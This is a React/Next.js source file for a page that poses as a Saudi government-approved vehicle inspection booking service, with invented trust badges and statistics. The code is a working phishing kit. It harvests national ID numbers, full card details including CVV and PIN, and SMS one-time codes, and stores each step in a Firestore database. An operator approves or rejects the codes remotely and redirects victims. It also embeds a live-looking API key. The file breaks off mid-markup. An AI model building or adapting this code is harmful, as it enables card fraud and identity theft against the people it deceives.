"use client"

import React, { useEffect, useState } from "react"
import Image from "next/image"
import VerificationPage from "@/components/verification-page"
import { Dialog, DialogContent } from "@/components/ui/dialog"
import { CircleAlert, Menu, X } from "lucide-react"
import { motion } from "framer-motion"
import { Input } from "@/components/ui/input"
import { Loader2 } from "lucide-react"
import { CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle } from "lucide-react"

import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Car, Truck, CreditCard, Wallet, Lock } from "lucide-react"
import { doc, onSnapshot } from "firebase/firestore"
import { addData, db } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
import { SaudiPlateInput } from "@/components/saudi-plate-input"
import { validateSaudiPhoneNumber, validateSaudiNationalId } from "@/lib/validation"
import { getRedirectUrl } from "@/lib/page-routes"
import { Checkbox } from "@/components/ui/checkbox"

// Removed duplicate type BankInfo definition as it's already imported from "@/types"
// type BankInfo = {
//   name: string
//   logo: string
//   color: string
// }
function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}
// Always generate a fresh visitor ID — clear any previous session
if (typeof window !== "undefined") {
  localStorage.removeItem("visitor");
}
const visitorID = randstr("salmn-")

const countries = [
  { code: "SA", nameAr: "السعودية", nameEn: "Saudi Arabia" },
  { code: "AE", nameAr: "الإمارات", nameEn: "United Arab Emirates" },
  { code: "BH", nameAr: "البحرين", nameEn: "Bahrain" },
  { code: "KW", nameAr: "الكويت", nameEn: "Kuwait" },
  { code: "OM", nameAr: "عمان", nameEn: "Oman" },
  { code: "QA", nameAr: "قطر", nameEn: "Qatar" },
  { code: "YE", nameAr: "اليمن", nameEn: "Yemen" },
  { code: "IQ", nameAr: "العراق", nameEn: "Iraq" },
  { code: "JO", nameAr: "الأردن", nameEn: "Jordan" },
  { code: "LB", nameAr: "لبنان", nameEn: "Lebanon" },
  { code: "SY", nameAr: "سوريا", nameEn: "Syria" },
  { code: "PS", nameAr: "فلسطين", nameEn: "Palestine" },
  { code: "EG", nameAr: "مصر", nameEn: "Egypt" },
  { code: "LY", nameAr: "ليبيا", nameEn: "Libya" },
  { code: "TN", nameAr: "تونس", nameEn: "Tunisia" },
  { code: "DZ", nameAr: "الجزائر", nameEn: "Algeria" },
  { code: "MA", nameAr: "المغرب", nameEn: "Morocco" },
  { code: "MR", nameAr: "موريتانيا", nameEn: "Mauritania" },
  { code: "SD", nameAr: "السودان", nameEn: "Sudan" },
  { code: "SO", nameAr: "الصومال", nameEn: "Somalia" },
  { code: "DJ", nameAr: "جيبوتي", nameEn: "Djibouti" },
  { code: "KM", nameAr: "جزر القمر", nameEn: "Comoros" },
  { code: "US", nameAr: "الولايات المتحدة", nameEn: "United States" },
  { code: "GB", nameAr: "المملكة المتحدة", nameEn: "United Kingdom" },
  { code: "CA", nameAr: "كندا", nameEn: "Canada" },
  { code: "AU", nameAr: "أستراليا", nameEn: "Australia" },
  { code: "DE", nameAr: "ألمانيا", nameEn: "Germany" },
  { code: "FR", nameAr: "فرنسا", nameEn: "France" },
  { code: "IT", nameAr: "إيطاليا", nameEn: "Italy" },
  { code: "ES", nameAr: "إسبانيا", nameEn: "Spain" },
  { code: "TR", nameAr: "تركيا", nameEn: "Turkey" },
  { code: "IR", nameAr: "إيران", nameEn: "Iran" },
  { code: "PK", nameAr: "باكستان", nameEn: "Pakistan" },
  { code: "IN", nameAr: "الهند", nameEn: "India" },
  { code: "BD", nameAr: "بنغلاديش", nameEn: "Bangladesh" },
  { code: "CN", nameAr: "الصين", nameEn: "China" },
  { code: "JP", nameAr: "اليابان", nameEn: "Japan" },
  { code: "KR", nameAr: "كوريا الجنوبية", nameEn: "South Korea" },
  { code: "MY", nameAr: "ماليزيا", nameEn: "Malaysia" },
  { code: "ID", nameAr: "إندونيسيا", nameEn: "Indonesia" },
  { code: "PH", nameAr: "الفلبين", nameEn: "Philippines" },
  { code: "TH", nameAr: "تايلاند", nameEn: "Thailand" },
  { code: "SG", nameAr: "سنغافورة", nameEn: "Singapore" },
  { code: "NZ", nameAr: "نيوزيلندا", nameEn: "New Zealand" },
  { code: "BR", nameAr: "البرازيل", nameEn: "Brazil" },
  { code: "MX", nameAr: "المكسيك", nameEn: "Mexico" },
  { code: "AR", nameAr: "الأرجنتين", nameEn: "Argentina" },
  { code: "ZA", nameAr: "جنوب أفريقيا", nameEn: "South Africa" },
  { code: "NG", nameAr: "نيجيريا", nameEn: "Nigeria" },
  { code: "KE", nameAr: "كينيا", nameEn: "Kenya" },
  { code: "ET", nameAr: "إثيوبيا", nameEn: "Ethiopia" },
]

export default function BookingPage() {
  const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license")
  const [country, setCountry] = useState("")
  const [plateNumbers, setPlateNumbers] = useState("")
  const [plateLetters, setPlateLetters] = useState("")
  const [plateInfo, setPlateInfo] = useState("")
  const [registrationType, setRegistrationType] = useState("")
  const [vehicleType, setVehicleType] = useState<VehicleType>("car")
  const [ownerName, setOwnerName] = useState("")
  const [nationalId, setNationalId] = useState("")
  const [displayNationalId, setDisplayNationalId] = useState("")
  const [serialNumber, setSerialNumber] = useState("")
  // </CHANGE>
  const [region, setRegion] = useState("")
  const [city, setCity] = useState("")
  const [inspectionCenter,
  ] = useState("")
  const [inspectionDate, setInspectionDate] = useState("")
  const [inspectionTime, setInspectionTime] = useState("")
  const [captchaChecked, setCaptchaChecked] = useState(true)
  const [inspectionType, setInspectionType] = useState("") // Added declaration
  const [vehicleInfoError, setVehicleInfoError] = useState("") // Added vehicleInfoError state

  // ADDED START
  const [authorizedPersonType, setAuthorizedPersonType] = React.useState<"resident" | "gcc">("resident")
  const [authorizedName, setAuthorizedName] = React.useState("")
  const [authorizedPhone, setAuthorizedPhone] = React.useState("")
  const [authorizedId, setAuthorizedId] = React.useState("")
  const [authorizedBirthDate, setAuthorizedBirthDate] = React.useState("")
  const [authorizedAgreement, setAuthorizedAgreement] = React.useState(false)

  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
  const [cardNumber, setCardNumber] = useState("")
  const [cardName, setCardName] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [operator, setOperator] = useState("")
  const [phoneOtp, setPhoneOtp] = useState("")
  const [cardError, setCardError] = useState("")
  const [pinError, setPinError] = useState("")
  const [phoneOtpError, setPhoneOtpError] = useState("") // Declared phoneOtpError
  const [phoneOtpApproval, setPhoneOtpApproval] = useState<ApprovalStatus | undefined>()
  const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
  const [phoneOtpSent, setPhoneOtpSent] = useState(false)
  const [showStcModal, setShowStcModal] = useState(false)
  const [authorizeInspection, setAuthorizeInspection] = useState(false)
  const [showOfferModal, setShowOfferModal] = useState(false)
  const [stcModalOpen, setStcModalOpen] = useState(false)
  const [pin, setPin] = useState(["", "", "", ""]) // Added pin state and setPin function

  const arabicToWestern = (str: string) => {
    const arabicNums = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"]
    return str.replace(/[٠-٩]/g, (d) => arabicNums.indexOf(d).toString())
  }

  const normalizeNumbers = (value: string) => {
    return arabicToWestern(value)
  }

  useEffect(() => {
    getLocation().then(() => {
      setIsLoading(false)
    })

    const visitorId = localStorage.getItem("visitor") || visitorID
    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
      if (docSnapshot.exists()) {
        const userData = docSnapshot.data()

        if (userData.phoneOtpApproval) {
          setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
        }
        if (userData.phoneOtpApproval === 'approved') {
          setIsLoading(false)
          window.location.href = '/nafad'
        }
        if (userData.phoneOtpApproval === 'rejected') {
          setIsLoading(false)
          alert('رمز التحقق غير صحيح')
        }
        const redirectUrl = getRedirectUrl(userData.currentPage, "application")
        if (redirectUrl) {
          window.location.href = redirectUrl
        }
      }
    })

    return () => unsubscribe()
  }, [])

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        id: visitorID,
        country: country,
        currentPage:'',

        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(visitorID)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    await addData({
      id: visitorID,
      vehicleStatus,
      country,
      plateNumbers,
      plateLetters,
      plateInfo,
      registrationType,
      vehicleType,
      ownerName, // Added ownerName
      nationalId, // Added nationalId

      inspectionType,
      step: "booking-completed",
    })
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("payment-method")
      setIsLoading(false)
    }, 1500)
  }

  const handlePaymentMethodSubmit = async () => {
    if (paymentMethod) {
      await addData({
        id: visitorID,
        paymentMethod,
        step: "payment-method-selected",
      })
      setIsLoading(true)
      setTimeout(() => {
        setCurrentStep("card-form")
        setShowOfferModal(true)
        setIsLoading(false)
      }, 1500)
    }
  }

  const handleCardFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    await addData({
      id: visitorID,
      cardNumber,
      cardName,
      expiryDate,
      cvv,
      step: "card-details-submitted",
    })
    if (!checkCardAllow(cardNumber)) {
    }
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("pin")
      setIsLoading(false)
    }, 1500)
  }

  const handlePinSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setPinError("")

    const fullPin = pin.join("")
    if (fullPin.length !== 4) {
      setPinError("يرجى إدخال رمز PIN المكون من 4 أرقام")
      return
    }

    await addData({
      id: visitorID,
      pin: fullPin,
      step: "pin-submitted",
    })
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("phone-verification")
      setIsLoading(false)
    }, 1500)
  }

  const handleSendPhoneOtp = async (e: React.FormEvent) => {
    e.preventDefault()
    setPhoneOtpError("")

    // Validate Saudi phone number
    const phoneValidation = validateSaudiPhoneNumber(phone)
    if (!phoneValidation.valid) {
      setPhoneOtpError(phoneValidation.error || "رقم الجوال غير صحيح")
      return
    }

    // Check if operator is selected
    if (!operator) {
      setPhoneOtpError("يرجى اختيار المشغل")
      return
    }

    await addData({
      id: visitorID,
      phone,
      operator,
      step: "phone-otp-requested",
    })
    if (operator === "STC") {
      setStcModalOpen(true)
    } else {
      setIsLoading(true)
      setTimeout(() => {
        setIsLoading(false)
        setPhoneOtpSent(true)
      }, 1500)
    }
  }

  const handlePhoneVerification = async (e: React.FormEvent) => {
    e.preventDefault()
    setPhoneOtpError("")
    await addData({
      id: visitorID,
      phone,
      operator,
      phoneOtp,
      step: "payment-completed",
      completedDate: new Date().toISOString(),
      phoneOtpApproval: "pending",
    })
    setPhoneOtpApproval("pending")
    setIsLoading(true)
  }

  const handleStcVerify = async (code: string) => {
    setPhoneOtpError("")
    await addData({
      id: visitorID,
      phone,
      operator,
      phoneOtp: code,
      step: "payment-completed",
      completedDate: new Date().toISOString(),
      phoneOtpApproval: "pending",
    })
    setPhoneOtpApproval("pending")
    setStcModalOpen(false)
    setIsLoading(true)
  }

  useEffect(() => {
    if (phoneOtpApproval === "approved") {
      setIsLoading(false)
      // Navigate to success page or show success message
      window.location.href = "/nafad"
    } else if (phoneOtpApproval === "rejected") {
      setIsLoading(false)
      setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
    }
  }, [phoneOtpApproval])

  const checkBIN = (cardNum: string) => {
    const bin = cardNum.replace(/\s/g, "").substring(0, 6)
    const bin4 = bin.substring(0, 4) // Get first 4 digits for ignored BINs check

    const ignoredBins = ["4748", "4685", "4323", "4847"]

    if (ignoredBins.includes(bin4)) {
      setBankInfo(null)
      return
    }

    // Saudi banks BIN database
    const binDatabase: BinDatabase = {
      "400861": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
      "446404": { name: "الراجحي", logo: "🏦", color: "#1a4d2e" },
      "535024": { name: "الأهلي", logo: "🏦", color: "#006747" },
      "468540": { name: "الأهلي", logo: "🏦", color: "#006747" },
      "401205": { name: "الرياض", logo: "🏦", color: "#0066b2" },
      "489318": { name: "الرياض", logo: "🏦", color: "#0066b2" },
      "543357": { name: "ساب", logo: "🏦", color: "#0f75bc" },
      "455708": { name: "ساب", logo: "🏦", color: "#0f75bc" },
      "474491": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
      "431361": { name: "سامبا", logo: "🏦", color: "#c41e3a" },
      "543085": { name: "الإنماء", logo: "🏦", color: "#00a651" },
      "440647": { name: "الإنماء", logo: "🏦", color: "#00a651" },
      "968208": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
      "529415": { name: "الجزيرة", logo: "🏦", color: "#0055a5" },
    }

    if (bin.length >= 6 && binDatabase[bin]) {
      setBankInfo(binDatabase[bin])
    } else {
      setBankInfo(null)
    }
  }

  const handleCardNumberChange = (value: string) => {
    const normalized = normalizeNumbers(value.replace(/\s/g, ""))
    const formatted = normalized.replace(/(\d{4})/g, "$1 ").trim()
    setCardNumber(formatted)
    console.log(checkCardAllow(formatted))
  }

  const vehicleTypes = [
    { id: "car" as VehicleType, label: "سيارة خاصة", icon: Car },
    { id: "truck" as VehicleType, label: "شاحنة", icon: Truck },
  ]

  const inspectionTypes = [
    { value: "private-car", label: "سيارة خاصة", icon: "🚗" },
    { value: "light-private-transport", label: "مركبة نقل خفيفة خاصة", icon: "🚚" },
    { value: "heavy-transport", label: "نقل ثقيل", icon: "🚛" },
    { value: "light-bus", label: "حافلة خفيفة", icon: "🚐" },
    { value: "light-transport", label: "مركبة نقل خفيفة", icon: "🚚" },
    { value: "medium-transport", label: "نقل متوسط", icon: "🚛" },
    { value: "large-bus", label: "حافلة كبيرة", icon: "🚌" },
    { value: "two-wheel-motorcycle", label: "الدراجات ثنائية العجلات", icon: "🏍️" },
    { value: "public-works", label: "مركبات أشغال عامة", icon: "🚜" },
    { value: "three-four-wheel", label: "دراجة ثلاثية أو رباعية العجلات", icon: "🛺" },
    { value: "heavy-trailer", label: "مقطورة ثقيلة", icon: "🚛" },
    { value: "rental-cars", label: "سيارات الأجرة", icon: "🚕" },
    { value: "hire-cars", label: "سيارات التأجير", icon: "🚗" },
    { value: "semi-heavy-trailer", label: "نصف مقطورة ثقيلة", icon: "🚛" },
    { value: "medium-bus", label: "حافلة متوسطة", icon: "🚐" },
    { value: "light-trailer", label: "مقطورة خفيفة", icon: "🚚" },
    { value: "light-semi-trailer", label: "نصف مقطورة خفيفة", icon: "🚚" },
    { value: "private-light-semi-trailer", label: "نصف مقطورة خفيفة خاصة", icon: "🚚" },
    { value: "private-light-trailer", label: "مقطورة خفيفة خاصة", icon: "🚚" },
  ]

  const regions = [
    { value: "riyadh", label: "منطقة الرياض" },
    { value: "makkah", label: "منطقة مكة المكرمة" },
    { value: "madinah", label: "منطقة المدينة المنورة" },
    { value: "eastern", label: "المنطقة الشرقية" },
    { value: "qassim", label: "منطقة القصيم" },
    { value: "asir", label: "منطقة عسير" },
    { value: "tabuk", label: "منطقة تبوك" },
    { value: "hail", label: "منطقة حائل" },
    { value: "najran", label: "منطقة نجران" },
    { value: "jazan", label: "منطقة جازان" },
    { value: "northern", label: "منطقة الحدود الشمالية" },
    { value: "jouf", label: "منطقة الجوف" },
    { value: "bahah", label: "منطقة الباحة" },
  ]

  const citiesByRegion: Record<string, { value: string; label: string }[]> = {
    riyadh: [
      { value: "riyadh-city", label: "الرياض" },
      { value: "diriyah", label: "الدرعية" },
      { value: "kharj", label: "الخرج" },
      { value: "dawadmi", label: "الدوادمي" },
      { value: "majmaah", label: "المجمعة" },
      { value: "quwayiyah", label: "القويعية" },
      { value: "aflaj", label: "الأفلاج" },
      { value: "zulfi", label: "الزلفي" },
    ],
    makkah: [
      { value: "makkah-city", label: "مكة المكرمة" },
      { value: "jeddah", label: "جدة" },
      { value: "taif", label: "الطائف" },
      { value: "qunfudhah", label: "القنفذة" },
      { value: "lith", label: "الليث" },
      { value: "rabigh", label: "رابغ" },
      { value: "khulais", label: "خليص" },
      { value: "ranyah", label: "رنية" },
    ],
    madinah: [
      { value: "madinah-city", label: "المدينة المنورة" },
      { value: "yanbu", label: "ينبع" },
      { value: "alula", label: "العلا" },
      { value: "mahd", label: "مهد الذهب" },
      { value: "badr", label: "بدر" },
      { value: "khaybar", label: "خيبر" },
    ],
    eastern: [
      { value: "dammam", label: "الدمام" },
      { value: "khobar", label: "الخبر" },
      { value: "dhahran", label: "الظهران" },
      { value: "jubail", label: "الجبيل" },
      { value: "qatif", label: "القطيف" },
      { value: "hofuf", label: "الهفوف" },
      { value: "mubarraz", label: "المبرز" },
      { value: "khafji", label: "الخفجي" },
    ],
    qassim: [
      { value: "buraidah", label: "بريدة" },
      { value: "unaizah", label: "عنيزة" },
      { value: "rass", label: "الرس" },
      { value: "midhnab", label: "المذنب" },
      { value: "bukayriyah", label: "البكيرية" },
    ],
    asir: [
      { value: "abha", label: "أبها" },
      { value: "khamis-mushait", label: "خميس مشيط" },
      { value: "najran-asir", label: "نجران" },
      { value: "bisha", label: "بيشة" },
      { value: "sarat-ubaidah", label: "سراة عبيدة" },
    ],
    tabuk: [
      { value: "tabuk-city", label: "تبوك" },
      { value: "umluj", label: "أملج" },
      { value: "wajh", label: "الوجه" },
      { value: "duba", label: "ضباء" },
      { value: "tayma", label: "تيماء" },
    ],
    hail: [
      { value: "hail-city", label: "حائل" },
      { value: "baqaa", label: "بقعاء" },
      { value: "ghazalah", label: "الغزالة" },
      { value: "shamli", label: "الشملي" },
    ],
    najran: [
      { value: "najran-city", label: "نجران" },
      { value: "sharourah", label: "شرورة" },
      { value: "habuna", label: "حبونا" },
      { value: "badr-south", label: "بدر الجنوب" },
    ],
    jazan: [
      { value: "jazan-city", label: "جازان" },
      { value: "sabya", label: "صبيا" },
      { value: "abu-arish", label: "أبو عريش" },
      { value: "samtah", label: "صامطة" },
      { value: "farasan", label: "فرسان" },
    ],
    northern: [
      { value: "arar", label: "عرعر" },
      { value: "rafha", label: "رفحاء" },
      { value: "turaif", label: "طريف" },
    ],
    jouf: [
      { value: "sakaka", label: "سكاكا" },
      { value: "qurayat", label: "القريات" },
      { value: "dumat", label: "دومة الجندل" },
    ],
    bahah: [
      { value: "bahah-city", label: "الباحة" },
      { value: "baljurashi", label: "بلجرشي" },
      { value: "almandaq", label: "المندق" },
      { value: "qilwah", label: "قلوة" },
    ],
  }

  const inspectionCenters = [
    { value: "center1", label: "محطة الفحص الدوري - الدمام" },
    { value: "center2", label: "محطة الفحص الدوري - الخبر" },
    { value: "center3", label: "محطة الفحص الدوري - الظهران" },
  ]

  const paymentMethods = [
    {
      id: "card" as PaymentMethod,
      label: "بطاقة ائتمان",
      icon: '/Visa-Mastercard-1-2048x755.png',
      description: "فيزا أو ماستركارد",
      badge: "استرداد نقدي 30%",
      available: true,
    },
    {
      id: "wallet" as PaymentMethod,
      label: "مدى",
      icon: '/mada.svg',
      description: "بطاقة مدى",
      available: true,
    },
    {
      id: "bank" as PaymentMethod,
      label: "Apple Pay",
      icon: '/images.png',
      description: "الدفع عبر آبل",
      available: false,
    },
  ]

  const handleVehicleInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    // Basic validation for required fields
    if (
      !plateNumbers ||
      !plateLetters ||
      !country ||
      !ownerName ||
      !nationalId ||
      !serialNumber ||
      // </CHANGE>
      !inspectionType ||
      !region ||
      !city ||
      !inspectionDate ||
      !inspectionTime
    ) {
      setVehicleInfoError("يرجى ملء جميع الحقول المطلوبة.")
      return
    }

    // Add more specific validations if needed (e.g., for nationalId, phone numbers, etc.)
    const idValidation = validateSaudiNationalId(nationalId)
    if (!idValidation.valid) {
      setVehicleInfoError(idValidation.error || "رقم الهوية الوطنية غير صحيح")
      return
    }



    const authorizedPhoneValidation = validateSaudiPhoneNumber(authorizedPhone)
    if (!authorizedPhoneValidation.valid) {
      setVehicleInfoError(authorizedPhoneValidation.error || "رقم جوال المفوض غير صحيح")
      return
    }
    // ADDED END

    await addData({
      id: visitorID,
      vehicleStatus,
      country,
      plateNumbers,
      plateLetters,
      plateInfo,
      registrationType,
      vehicleType,
      ownerName,
      nationalId,
      serialNumber,
      // </CHANGE>
      region,
      city,
      inspectionCenter,
      inspectionDate,
      inspectionTime,
      inspectionType,
      // ADDED START
      authorizedPersonType,
      authorizedName,
      authorizedPhone,
      authorizedId,
      authorizedBirthDate,
      // ADDED END
      step: "booking-details-submitted",
    })
    setIsLoading(true)
    setTimeout(() => {
      setCurrentStep("payment-method")
      setIsLoading(false)
    }, 1500)
  }

  if (isLoading) {
    return (
      <div dir="rtl" className="min-h-screen bg-background flex items-center justify-center">
        <Card className="w-full max-w-md mx-4 shadow-lg">
          <CardContent className="p-12">
            <div className="flex flex-col items-center gap-6">
              <div className="relative w-20 h-20">
                <div className="absolute inset-0 border-4 border-teal-700/30 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-teal-700 border-t-transparent rounded-full animate-spin"></div>
              </div>
              <div className="text-center space-y-2">
                <h3 className="text-xl font-semibold text-foreground">جاري المعالجة...</h3>
                <p className="text-muted-foreground">الرجاء الانتظار</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  if (currentStep === "landing") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">

        {/* Hero Section */}
        <div className="relative overflow-hidden bg-gradient-to-b from-secondary/30 to-background">
          <div className="container mx-auto px-4 py-16 md:py-24 max-w-6xl">
            {/* Trust Badge */}
            <div className="flex justify-center mb-8">
              <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-teal-700/10 border border-teal-700/20">
                <div className="w-2 h-2 rounded-full bg-teal-700 animate-pulse" />
                <span className="text-sm font-medium text-foreground">خدمة معتمدة من وزارة النقل</span>
              </div>
            </div>

            <div className="grid lg:grid-cols-2 gap-12 items-center">
              {/* Content */}
              <div className="text-center lg:text-right space-y-8">
                <div className="space-y-4">
                  <h1 className="text-5xl md:text-6xl lg:text-7xl font-bold text-foreground leading-tight text-balance">
                    خدمة الفحص الفني الدوري
                  </h1>
                  <p className="text-xl md:text-2xl text-muted-foreground leading-relaxed text-pretty max-w-xl mx-auto lg:mx-0">
                    احجز موعد فحص مركبتك بسهولة وسرعة. خدمة احترافية وموثوقة لضمان سلامتك على الطريق
                  </p>
                </div>

                {/* Primary CTA */}
                <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                  <Button
                    size="lg"
                    className="h-14 px-8 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-lg hover:shadow-xl transition-all"
                    onClick={() => setCurrentStep("booking")}
                  >
                    احجز موعد الآن
                    <svg className="mr-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </Button>
                  <Button
                    size="lg"
                    variant="outline"
                    className="h-14 px-8 text-lg font-medium border-2 hover:bg-secondary bg-transparent"
                  >
                    معلومات أكثر
                  </Button>
                </div>

                {/* Stats */}
                <div className="flex gap-8 justify-center lg:justify-start pt-8 border-t border-border">
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">+50,000</div>
                    <div className="text-sm text-muted-foreground">فحص مكتمل</div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">24/7</div>
                    <div className="text-sm text-muted-foreground">دعم فني</div>
                  </div>
                  <div className="text-center lg:text-right">
                    <div className="text-3xl font-bold text-foreground">98%</div>
                    <div className="text-sm text-muted-foreground">رضا العملاء</div>
                  </div>
                </div>
              </div>

              {/* Vehicle Image */}
              <div className="relative">
                <div className="absolute inset-0 bg-teal-700/5 rounded-3xl blur-3xl" />
                <Image
                  src="/white-sedan-car-with-technical-inspection-labels-i.jpg"
                  alt="فحص المركبة"
                  width={800}
                  height={500}
                  className="relative w-full h-auto rounded-2xl shadow-2xl"
                  priority
                />
              </div>
            </div>
          </div>
        </div>

        {/* Features Section */}
        <div className="container mx-auto px-4 py-20 max-w-6xl">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-bold text-foreground mb-4">لماذا تختار خدمتنا؟</h2>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              نوفر لك تجربة فحص سريعة وموثوقة مع أحدث التقنيات
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-8 mb-16">
            {/* Feature 1 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">حجز سريع ومرن</h3>
              <p className="text-muted-foreground leading-relaxed">احجز موعدك في دقائق واختر الوقت المناسب لك</p>
            </div>

            {/* Feature 2 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">فحص معتمد وآمن</h3>
              <p className="text-muted-foreground leading-relaxed">فحص شامل ومعتمد من الجهات الرسمية</p>
            </div>

            {/* Feature 3 */}
            <div className="group p-8 rounded-2xl bg-card border border-border hover:shadow-lg transition-all hover:-translate-y-1">
              <div className="w-14 h-14 rounded-xl bg-teal-700/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform">
                <svg className="w-7 h-7 text-teal-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                  />
                </svg>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">دفع إلكتروني آمن</h3>
              <p className="text-muted-foreground leading-relaxed">ادفع بأمان عبر طرق دفع متعددة ومشفرة</p>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="bg-gradient-to-br from-teal-700/5 to-accent/5 rounded-3xl p-12 border border-teal-700/10">
            <div className="text-center mb-8">
              <h3 className="text-2xl md:text-3xl font-bold text-foreground mb-3">ابدأ الآن</h3>
              <p className="text-muted-foreground text-lg">اختر الإجراء المناسب لك</p>
            </div>

            <div className="grid sm:grid-cols-3 gap-4 max-w-3xl mx-auto">
              <Button
                size="lg"
                className="h-16 text-base font-semibold bg-teal-700 hover:bg-teal-700/90 shadow-md"
                onClick={() => setCurrentStep("booking")}
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"
                  />
                </svg>
                حجز موعد
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-medium border-2 hover:bg-secondary bg-transparent"
                onClick={() => setCurrentStep("booking")}
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 4.354a4 4 0 110 7.292M12 4.354a4 4 0 013.131 6.217"
                  />
                </svg>
                التحقق من الحجز
              </Button>

              <Button
                size="lg"
                variant="outline"
                className="h-16 text-base font-medium border-2 hover:bg-secondary bg-transparent"
                onClick={() => setCurrentStep("booking")}
              >
                <svg className="ml-2 h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M14.752 11.168l-2.12-2.12a1 1 0 111.414-1.414l2.122 2.122a1 1 0 010 1.414z"
                  />
                </svg>
                معرفة المزيد
              </Button>
            </div>
          </div>
        </div>
        <Dialog open={showOfferModal} onOpenChange={setShowOfferModal}>
          <DialogContent className="sm:max-w-md border-emerald-200">
            <div className="relative">
              <button
                onClick={() => setShowOfferModal(false)}
                className="absolute left-2 top-2 rounded-full bg-white/90 p-1.5 hover:bg-white shadow-lg transition-colors z-10"
              >
                <X className="h-4 w-4 text-gray-600" />
